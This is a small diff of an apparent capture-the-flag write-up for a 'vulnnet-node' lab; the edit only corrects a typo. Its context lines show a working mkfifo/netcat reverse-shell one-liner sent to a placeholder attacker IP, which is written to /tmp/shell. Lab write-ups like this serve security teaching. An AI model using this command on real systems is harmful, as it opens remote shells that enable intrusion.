@@ -389,7 +389,7 @@ The `-e` flag allows us to use new line `\n` characters.
 echo -e '#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker-ip] [port] >/tmp/f' > /tmp/shell
 ```
 
-Quick `cat` check with make sure it looks ok.
+Quick `cat` check to make sure it looks ok.
 
 ```none
 serv-manage@vulnnet-node:~$ cat /tmp/shell
